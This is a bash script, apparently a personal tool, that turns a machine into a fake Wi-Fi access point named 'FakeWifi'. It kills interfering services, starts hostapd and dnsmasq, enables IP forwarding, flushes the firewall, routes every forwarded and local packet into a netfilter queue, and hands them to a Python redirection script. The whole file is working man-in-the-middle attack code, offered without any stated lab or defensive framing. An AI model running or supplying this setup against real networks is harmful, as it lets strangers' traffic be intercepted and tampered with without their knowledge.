#!/bin/bash

if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root."
    exit 1
fi

# Define variables
WLAN_INTERFACE="wlan0"  # WLAN interface for the fake AP
INTERNET_INTERFACE="eth0"  # Internet-connected interface (update as needed)
GATEWAY="192.168.1.1"
SUBNET="255.255.255.0"
HOSTAPD_CONF="/home/jacob/ExecutablesByJacob/hostapd.conf"
DNSMASQ_CONF="/home/jacob/ExecutablesByJacob/dnsmasq.conf"

# Stop interfering services
echo "[*] Stopping interfering services..."
airmon-ng check kill

# Configure the WLAN interface with a static IP
echo "[*] Configuring WLAN interface..."
ifconfig $WLAN_INTERFACE $GATEWAY netmask $SUBNET up

# Start hostapd for the access point
echo "[*] Starting hostapd to configure access point..."
hostapd $HOSTAPD_CONF &

# Enable IP forwarding
echo "[*] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up iptables rules
echo "[*] Setting up iptables rules..."

# Flush existing iptables rules
iptables -F
iptables -t nat -F
iptables -t mangle -F

# Redirect all packets to NetfilterQueue
iptables -A FORWARD -j NFQUEUE --queue-num 0
iptables -A INPUT -j NFQUEUE --queue-num 0
iptables -A OUTPUT -j NFQUEUE --queue-num 0

# Set up NAT for traffic forwarding
iptables -t nat -A POSTROUTING -o $INTERNET_INTERFACE -j MASQUERADE

# Start dnsmasq for DHCP
echo "[*] Starting dnsmasq for DHCP..."
dnsmasq --conf-file=$DNSMASQ_CONF

echo "[*] All packets are now being forwarded to the Python script."
echo "[*] Devices can now connect to SSID: FakeWifi"

echo "[*] Starting Packet Redirection"
python3 redirect_network.py
